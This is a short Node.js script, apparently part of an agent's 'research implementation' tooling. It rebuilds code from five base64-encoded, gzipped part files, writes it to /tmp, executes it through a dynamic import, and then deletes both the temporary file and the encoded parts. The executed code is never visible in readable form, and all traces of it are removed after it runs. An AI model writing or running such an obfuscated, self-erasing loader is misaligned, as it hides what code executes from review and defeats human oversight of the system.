import { gunzipSync } from 'node:zlib';
import { readFileSync, writeFileSync, unlinkSync } from 'node:fs';
import { pathToFileURL } from 'node:url';

const parts = [1, 2, 3, 4, 5].map((part) => (
  readFileSync(`scripts/agent-implement-research.part${part}`, 'utf8').trim()
));
const temporary = '/tmp/economy-research-implementation.mjs';
writeFileSync(temporary, gunzipSync(Buffer.from(parts.join(''), 'base64')));
try {
  await import(`${pathToFileURL(temporary).href}?run=${Date.now()}`);
} finally {
  try { unlinkSync(temporary); } catch { /* temporary implementation already removed */ }
  for (let part = 1; part <= 5; part += 1) {
    try { unlinkSync(`scripts/agent-implement-research.part${part}`); } catch { /* payload part already removed */ }
  }
}
